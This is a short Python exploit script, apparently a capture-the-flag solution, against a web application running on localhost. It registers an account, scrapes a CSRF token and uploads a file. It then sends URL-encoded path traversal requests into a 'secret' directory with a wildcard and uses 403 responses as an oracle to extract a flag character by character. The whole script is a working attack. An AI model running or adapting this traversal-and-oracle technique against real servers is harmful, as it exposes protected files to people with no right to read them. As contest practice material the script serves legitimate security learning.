import requests
import re
import string

url = "http://localhost:25027"

s = requests.Session()

credentials = {
    "username": "jain",
    "password": "jainstreakpass"
}

# Register and login
r = s.post(url + "/api/users/register", json=credentials)
s.post(url + "/api/users/login", json=credentials)

# Get CSRF token
r = s.get(url + "/gallery")
token = re.search(r'<input name="dream.csrf" type="hidden" value="(.+)">', r.text).group(1)

# Upload a file
files = {
    "files": ("test.txt", open("test.txt", "rb")),
    "dream.csrf": (None, token)
}

# Trigger a directory creation
r = s.post(url + "/api/uploads", files=files)

flag = ""

charlist = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}"

def transfur(c):
    return "\\" + c + "" if c in '{}' else c

def transfur_all(s):
    return "".join((map(transfur, s)))

while True:
    ok = False
    for c in charlist:
        r = s.get(url + r"/api/uploads/%2e%2e%2f%2e%2e%2fsecret%2f" + transfur_all(flag + c) + "*")
        if r.status_code == 403:
            flag += c
            print(flag)
            ok = True
            break
    if not ok:
        break
    
print(flag)
    
